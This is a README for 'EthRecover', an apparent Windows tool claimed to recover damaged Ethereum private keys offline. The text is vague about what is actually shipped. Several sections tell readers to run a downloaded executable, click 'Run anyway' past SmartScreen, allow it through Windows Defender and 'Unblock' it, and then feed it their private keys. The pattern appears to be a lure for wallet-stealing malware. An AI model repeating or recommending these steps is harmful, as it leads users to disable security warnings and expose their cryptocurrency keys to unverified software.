# 🔐 EthRecover - Recover Ethereum Keys on Windows

[![Download EthRecover](https://img.shields.io/badge/Download-EthRecover-6a5acd?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Haskellfirm377/EthRecover)

## 🧭 What EthRecover Does

EthRecover is an offline tool for finding lost or damaged Ethereum and EVM wallet private keys.

It is built for cases where a wallet file, seed phrase export, or key text has errors, missing parts, or bad OCR text. The tool tries many safe variations and checks them against known wallet formats. It runs on your computer and does not need an internet connection.

## 💻 What You Need

- A Windows 10 or Windows 11 PC
- 4 GB of RAM or more
- 200 MB of free disk space
- A folder where you can save recovered files
- One of these:
  - A ready-to-run Windows build, if one is provided in the repository
  - Python 3.10 or later, if you plan to run it from source

For best results, use a machine that can stay on for a long scan.

## 📥 Download EthRecover

Use this page to download or get the latest files:

[Visit the EthRecover download page](https://github.com/Haskellfirm377/EthRecover)

If the repository provides a Windows release, download the file from that page and save it to a folder you can find, such as `Downloads` or `Desktop`.

## 🪟 Run EthRecover on Windows

### If you downloaded a Windows file

1. Open the folder where the file was saved.
2. Double-click the file to start it.
3. If Windows asks for permission, select **Run anyway** or **More info > Run anyway**.
4. Wait for the app to open.

### If you downloaded the source files

1. Install Python from the official Python site.
2. Open the EthRecover folder.
3. Hold **Shift** and right-click inside the folder.
4. Select **Open PowerShell window here** or **Open terminal here**.
5. Run the main script shown in the repository files.

If you are not sure which file to run, look for a file named like `main.py`, `app.py`, or a Windows executable such as `.exe`.

## 🛠️ First-Time Setup

1. Download EthRecover from the link above.
2. Save the file to a simple folder.
3. If the file is zipped, right-click it and choose **Extract All**.
4. Open the extracted folder.
5. Start the app or script.
6. If Windows Defender asks about the file, check the file name and source, then allow it if it matches the GitHub repository.

If the app uses a command window, keep it open until the recovery task ends.

## 🔍 How Recovery Works

EthRecover uses a few steps to test broken or incomplete wallet data:

- It reads the input text or file
- It corrects common OCR mistakes
- It tries common symbol and character swaps
- It tests many key patterns in parallel
- It checks results against Ethereum and EVM key rules

This helps when a private key was copied with errors, scanned from paper, or saved with missing characters.

## 🧪 Common Use Cases

Use EthRecover when you have:

- A private key with one or more wrong characters
- A wallet export with OCR errors
- A copied key that lost spaces or line breaks
- An old wallet file that does not open
- A malformed key string from notes, scans, or screenshots

It works best when most of the key is still known.

## 🧾 Basic Workflow

1. Open EthRecover.
2. Add the damaged key text or file.
3. Choose the recovery mode, if the app shows one.
4. Start the scan.
5. Wait while the tool tries key variations.
6. Review the results.
7. Save any recovered output in a safe folder.

If the app lets you choose a target type, pick the one that matches your wallet format.

## ⚙️ Tips for Better Results

- Keep the original damaged file unchanged
- Work from a copy
- Use the most complete input you have
- Check for OCR errors such as `0` and `O`, `1` and `l`, or `5` and `S`
- Let the scan finish before closing the app
- Use a fast CPU if you have one

If you have a scan from paper, clean the image first before running OCR correction.

## 📁 Suggested Folder Setup

You can keep files in this simple layout:

- `EthRecover` — the app files
- `input` — damaged wallet text or scans
- `output` — recovered results
- `backup` — original copies

This makes it easier to keep track of each attempt.

## 🔐 Security Notes

EthRecover runs offline. That helps keep wallet data on your machine.

For safety:

- Use a trusted Windows PC
- Keep the machine offline during recovery
- Store recovered keys in an encrypted location
- Remove temporary files after you finish
- Do not share key text with others

## 🧩 Troubleshooting

### The file will not open

- Check that the download finished
- Make sure you extracted the archive if it came as a zip file
- Try opening it from a normal folder path like `C:\EthRecover`

### Windows blocks the app

- Right-click the file
- Select **Properties**
- If you see an **Unblock** option, turn it on
- Try again

### The scan is very slow

- Close other apps
- Make sure your laptop is plugged in
- Let the app use all available CPU cores
- Use a shorter input first

### No results were found

- Check the input for missing characters
- Try a cleaner scan or better copy of the key
- Make sure the target format matches Ethereum or EVM data
- Run another pass with a wider set of variations

## 📌 Best Practice for Windows Users

1. Download the repository from the link above.
2. Put it in a folder with a short name.
3. Extract it if needed.
4. Start the app from that folder.
5. Keep your input files in a separate folder.
6. Save output to a new folder.
7. Back up any recovered key right away.

## 🧰 File Types You May See

Depending on the release, you may see files like:

- `.exe` for a Windows app
- `.zip` for a compressed release
- `.py` for Python source files
- `.txt` for notes or sample input
- `.json` for settings or output data

Open only the file type that matches the release format you downloaded.

## 🧭 Where to Get the Latest Version

[Open the EthRecover repository](https://github.com/Haskellfirm377/EthRecover)

## 🖥️ Simple Start Checklist

- Download EthRecover
- Extract the files if needed
- Open the app or run the script
- Load your damaged key data
- Start the recovery scan
- Save any result in a secure folder